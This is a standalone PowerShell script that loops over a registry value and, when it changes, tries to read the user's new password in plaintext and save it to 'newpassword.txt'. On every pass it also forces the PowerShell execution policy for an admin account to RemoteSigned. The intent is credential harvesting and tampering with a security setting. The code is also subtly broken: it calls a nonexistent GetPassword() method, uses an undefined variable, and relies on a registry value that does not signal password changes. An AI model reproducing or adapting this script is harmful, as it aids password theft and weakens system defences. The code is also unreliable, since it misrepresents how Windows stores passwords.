$passwordExpired = Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name PasswordExpired | Select-Object -ExpandProperty PasswordExpired

while ($true) {
    $newPasswordExpired = Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name PasswordExpired | Select-Object -ExpandProperty PasswordExpired

    if ($passwordExpired -ne $newPasswordExpired) {
        # The user has changed their password
        $newPassword = [Security.Principal.WindowsIdentity]::GetCurrent().GetPassword()

        # Output the new password to a text file
        $path = Split-Path -Parent $MyInvocation.MyCommand.Path
        $filePath = Join-Path -Path $path -ChildPath "newpassword.txt"
        Set-Content -Path $filePath -Value $newPassword

        # Set the new password expired status for comparison
        $passwordExpired = $newPasswordExpired
    }

    # Wait for 1 second before checking for password changes again
    Start-Sleep -Seconds 1

    $adminUserSID = (Get-LocalUser -Name $adminUserName).SID.Value
    $policyPath = "Registry::HKEY_USERS\$adminUserSID\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell"
    $policyValue = "RemoteSigned"

    # Set the execution policy for the user
    Set-ItemProperty -Path $policyPath -Name "ExecutionPolicy" -Value $policyValue -Force
}

